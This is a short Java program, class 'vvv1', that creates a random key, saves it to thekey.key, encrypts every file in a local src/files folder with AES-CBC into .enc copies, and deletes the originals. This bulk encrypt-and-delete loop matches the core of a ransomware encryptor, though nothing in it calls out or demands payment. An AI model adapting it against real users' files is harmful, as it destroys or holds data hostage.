import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.file.*;
import java.security.*;
import java.util.Arrays;

public class vvv1 {

    public static void main(String[] args) {
        Path folderPath = Paths.get("src", "files");
        Path keyFilePath = Paths.get("thekey.key");

        String key = makeKey(keyFilePath.toString(), 32);

        File folder = folderPath.toFile();
        File[] listOfFiles = folder.listFiles();

        for (File file : listOfFiles) {
            if (file.isFile() && !file.getName().equals("thekey.key") && !file.getName().endsWith(".enc")) {
                try {
                    byte[] fileData = Files.readAllBytes(file.toPath());
                    byte[] encryptedData = encrypt(fileData, key);

                    Path encryptedPath = Paths.get(file.getAbsolutePath() + ".enc");
                    Files.write(encryptedPath, encryptedData);
                    Files.delete(file.toPath());

                    System.out.println("Encrypted: " + file.getName());
                } catch (Exception e) {
                    System.err.println("Error: " + e.getMessage());
                }
            }
        }
    }

    public static String makeKey(String filePath, int length) {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+=<>?";
        SecureRandom random = new SecureRandom();
        StringBuilder key = new StringBuilder();

        for (int i = 0; i < length; i++) {
            key.append(chars.charAt(random.nextInt(chars.length())));
        }

        try (FileWriter writer = new FileWriter(filePath)) {
            writer.write(key.toString());
            System.out.println("Key saved to: " + filePath);
        } catch (IOException e) {
            System.out.println("Failed to write key");
        }

        return key.toString();
    }

    public static SecretKeySpec getAESKeyFromString(String myKey) throws Exception {
        byte[] key = myKey.getBytes("UTF-8");
        MessageDigest sha = MessageDigest.getInstance("SHA-256");
        key = sha.digest(key);
        return new SecretKeySpec(Arrays.copyOf(key, 16), "AES");
    }

    public static byte[] encrypt(byte[] data, String keyString) throws Exception {
        SecretKeySpec secretKey = getAESKeyFromString(keyString);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");

        byte[] iv = new byte[16];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);

        cipher.init(Cipher.ENCRYPT_MODE, secretKey, new IvParameterSpec(iv));
        byte[] encrypted = cipher.doFinal(data);

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        outputStream.write(iv);
        outputStream.write(encrypted);

        return outputStream.toByteArray();
    }
}
